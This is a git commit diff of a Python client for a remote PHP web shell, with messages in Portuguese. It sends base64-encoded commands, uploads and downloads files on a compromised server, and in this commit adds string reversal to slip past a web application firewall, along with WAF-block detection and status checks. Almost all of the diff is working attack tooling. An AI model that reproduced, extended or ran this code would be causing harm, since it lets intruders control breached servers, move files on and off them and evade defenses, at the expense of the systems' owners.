cd36016f55f0bcd9b2ad66146c15ecd3b146d320
Mateus <17793927+MKSx@users.noreply.github.com>
2020-08-09 20:33:13 -0300

    Update client.py

--- client.py
+++ client.py
@@ -1,4 +1,4 @@
-import requests, base64, logging, os
+import requests, base64, logging, os, time
 from tqdm import tqdm
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
@@ -9,6 +9,9 @@ class WebShellConnectionError(Exception):
 	pass
 class WebShellCMDError(Exception):
 	pass
+class WebShellWAFBlock(Exception):
+	pass
+
 class WebShellDecodeError(Exception):
 	def __init__(self, message, content, headers, status_code, reason):
 		self.message = message
@@ -21,6 +24,7 @@ class WebShellDecodeError(Exception):
 #https://stackoverflow.com/a/41041028/13886183
 try:
     requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
+
 except AttributeError:
     pass
 
@@ -36,9 +40,18 @@ class WebShell:
 		self.path = '/'
 		self.local_cmds = False
 		self.logger = logging.getLogger()
+
+		self.logger.info('Iniciando webshell')
 		if not self.endpoint.endswith('?e=1'):
 			self.endpoint += '?e=1&b=1'
 
+		if self._status():
+			self.logger.info("Webshell online")
+		else:
+			self.logger.error('Webshell offline')
+			exit()
+
+		self.logger.info("Ping de {} ms".format(self._ping()))
 
 		self._auth()
 
@@ -51,7 +64,10 @@ class WebShell:
 				
 				'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0'
 			}, allow_redirects=False)
-			
+
+			if self.verifyWAFBlock(res):
+				raise WebShellWAFBlock('Requisição bloqueada pelo WAF')
+
 			if res.status_code != 200 or not self._getHeaderInfo(res):
 				
 				raise WebShellAuthError('Não foi possível realizar login')
@@ -72,7 +88,11 @@ class WebShell:
 		return False
 	def _download(self, file, dest):
 		try:
-			res = self.session.post(self.endpoint, data={'a': base64.b64encode('download {}'.format(file).encode()).decode()}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0'}, verify=False, allow_redirects=False, stream=True)
+			res = self.session.post(self.endpoint, data={'a': base64.b64encode('download {}'.format(file).encode()).decode()[::-1]}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0'}, verify=False, allow_redirects=False, stream=True)
+			
+			if self.verifyWAFBlock(res):
+				raise WebShellWAFBlock('Requisição bloqueada pelo WAF')
+
 			if res.status_code == 401:
 				self._auth()
 				return 'Usuário não autenticado'
@@ -107,15 +127,20 @@ class WebShell:
 				print(getattr(self.local_cmds, args[0])(self, args[1], len(args[1])))
 				return
 		try:
+		
 			res = self.session.post(self.endpoint, data={
-				'a': base64.b64encode(cmd.encode()).decode()
+				'a': base64.b64encode(cmd.encode()).decode()[::-1]
 			}, headers={
 				'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0'
 			}, allow_redirects=False)
+
+			if self.verifyWAFBlock(res):
+				raise WebShellWAFBlock('Requisição bloqueada pelo WAF')
+
 			if res.status_code == 401:
 				self._auth()
 				return
-
+			
 			if not self._getHeaderInfo(res):
 				raise WebShellCMDError('Erro ao obter os dados do path e usuário atualizado')
 
@@ -132,9 +157,10 @@ class WebShell:
 		def startupload(this, filename):
 			try:
 				res = this.session.post(this.endpoint, data={
-					'a': base64.b64encode('start-upload {}'.format(filename).encode()).decode()
+					'a': base64.b64encode('start-upload {}'.format(filename).encode()).decode()[::-1]
 				}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0'}, allow_redirects=False)
-
+				if self.verifyWAFBlock(res):
+					raise WebShellWAFBlock('Requisição bloqueada pelo WAF')
 				if res.status_code != 200:
 					try:
 						return base64.b64decode(res.content).decode()
@@ -149,9 +175,10 @@ class WebShell:
 		def uploadblock(this, block):
 			try:
 				res = this.session.post(this.endpoint, data={
-					'a': base64.b64encode('upload-block {}'.format(block).encode()).decode()
+					'a': base64.b64encode('upload-block {}'.format(block).encode()).decode()[::-1]
 				}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0'}, allow_redirects=False)
-
+				if self.verifyWAFBlock(res):
+					raise WebShellWAFBlock('Requisição bloqueada pelo WAF')
 				if res.status_code != 200:
 					try:
 						return (False, base64.b64decode(res.content).decode())
@@ -166,8 +193,12 @@ class WebShell:
 		def finishupload(this):
 			try:
 				res = this.session.post(this.endpoint, data={
-					'a': base64.b64encode(b'stop-upload').decode()
+					'a': base64.b64encode(b'stop-upload').decode()[::-1]
 				}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0'}, allow_redirects=False)
+				
+				if self.verifyWAFBlock(res):
+					raise WebShellWAFBlock('Requisição bloqueada pelo WAF')
+
 				try:
 					return (res.status_code == 201, base64.b64decode(res.content).decode())
 				except:
@@ -198,12 +229,46 @@ class WebShell:
 
 		return "Não foi possível abrir o arquivo '{}'".format(filename)
 
+	def _upload(self, filename, dest):
+
+		try:
+			res = self.session.post(self.endpoint, data={
+				'a': base64.b64encode('upload {}'.format(dest).encode()).decode()[::-1]
+			}, files={'f': open(filename, 'rb')}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0'}, allow_redirects=False)
+
+			if self.verifyWAFBlock(res):
+				raise WebShellWAFBlock('Requisição bloqueada pelo WAF')
+
+			if res.status_code == 401:
+				self._auth()
+				return 'Usuário não autenticado, tentando autenticar novamente'
+
+			try:
+				return base64.b64decode(res.content).decode()
+			except:
+				return res.text
+
+		except requests.exceptions.ConnectionError as e:
+			raise WebShellCMDError(e)
+
+	def _status(self):
+		try:
+			return requests.get(self.endpoint + ('&st=1' if self.endpoint.find('?') else '?st=1'), headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0'}, allow_redirects=False, verify=False).status_code == 200
+		except requests.exceptions.ConnectionError as e:
+			raise WebShellCMDError(e)
+	def _ping(self):
+		a = int(time.time())
+		self._status()
+		return int(time.time()) - a
 
 	def _input(self):
 		return input('\033[1;31m{}\033[37m:\033[1;34m{}\033[37m$ '.format(self.user, self.path)).strip()
 
 	def on(self, local_class):
 		self.local_cmds = local_class
+	
+	def verifyWAFBlock(self, res):
+		return res.text.find('The requested URL was rejected. Please consult with your administrator.') > -1
 
 	def shell(self):
 		exit_cmds = ['quit', 'exit']
@@ -266,7 +331,7 @@ class localCMDs:
 	@staticmethod
 	def uploadinblocks(this, args, length):
 		if length < 1:
-			return "Use uploadinblocks [local do arquivo] [destino]"
+			return "Use uploadinblocks [local do arquivo] [destino] [block size (default 1024)]"
 		args = args.split(' ', 2)
 		if len(args) < 2:
 			args.append('./')
@@ -283,9 +348,32 @@ class localCMDs:
 			args[1] = './'
 
 		if args[1].endswith('/'):
-			args[1] += os.path.filename(args[0])
+			args[1] += os.path.basename(args[0])
 
 		return this._uploadinblocks(args[0], args[1], args[2])
+	@staticmethod
+	def upload(this, args, length):
+		if length < 1:
+			return "Use upload [local do arquivo] [destino]"
+
+		args = args.split(' ', 2)
+		if len(args) < 2:
+			args.append('./')
+
+		if len(args[0]) < 1 or not os.path.isfile(args[0]):
+			return "Arquivo '{}' não encontrado".format(args[0])
+		
+		if len(args[1]) < 1:
+			args[1] = './'
+
+		if args[1].endswith('/'):
+			args[1] += os.path.basename(args[0])
+
+		return this._upload(args[0], args[1])
+	
+	@staticmethod
+	def webshellping(this, args, length):
+		return 'Ping com o servidor de {} ms'.format(this._ping())
 
 def main():
 	ws = WebShell('admin', 'admin', 'http://localhost/cmd.php')
